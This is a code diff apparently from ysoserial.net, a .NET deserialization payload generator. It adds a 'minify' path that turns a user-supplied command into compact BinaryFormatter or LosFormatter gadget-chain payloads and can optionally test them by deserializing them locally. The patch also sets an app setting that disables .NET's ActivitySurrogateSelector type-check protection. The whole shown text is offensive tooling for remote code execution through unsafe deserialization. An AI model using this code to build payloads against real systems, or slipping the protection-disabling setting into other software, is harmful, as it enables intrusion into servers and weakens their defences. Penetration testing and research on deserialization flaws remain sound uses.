@@ -63,9 +63,50 @@ namespace ysoserial.Generators
         
         public override object Generate(string formatter, InputArgs inputArgs)
         {
+            // Disable ActivitySurrogate type protections during generation
+            System.Configuration.ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");
+
             try
             {
                 PayloadClassFromFile payload = new PayloadClassFromFile(inputArgs.Cmd, variant_number, inputArgs);
+
+                if (inputArgs.Minify)
+                {
+                    byte[] payloadInByte = payload.GadgetChainsToBinaryFormatter();
+                    if (formatter.ToLower().Equals("binaryformatter"))
+                    {
+                        if (inputArgs.Test)
+                        {
+                            try
+                            {
+                                SerializersHelper.BinaryFormatter_deserialize(payloadInByte);
+                            }
+                            catch (Exception err)
+                            {
+                                Debugging.ShowErrors(inputArgs, err);
+                            }
+                        }
+
+                        return payloadInByte;
+                    }
+                    else if (formatter.ToLower().Equals("losformatter"))
+                    {
+                        payloadInByte = Helpers.ModifiedVulnerableBinaryFormatters.SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(payload.GadgetChainsToBinaryFormatter());
+
+                        if (inputArgs.Test)
+                        {
+                            try
+                            {
+                                SerializersHelper.LosFormatter_deserialize(payloadInByte);
+                            }
+                            catch (Exception err)
+                            {
+                                Debugging.ShowErrors(inputArgs, err);
+                            }
+                        }
+                        return payloadInByte;
+                    }
+                }    
                 return Serialize(payload, formatter, inputArgs);
             }
             catch(System.IO.FileNotFoundException e1)
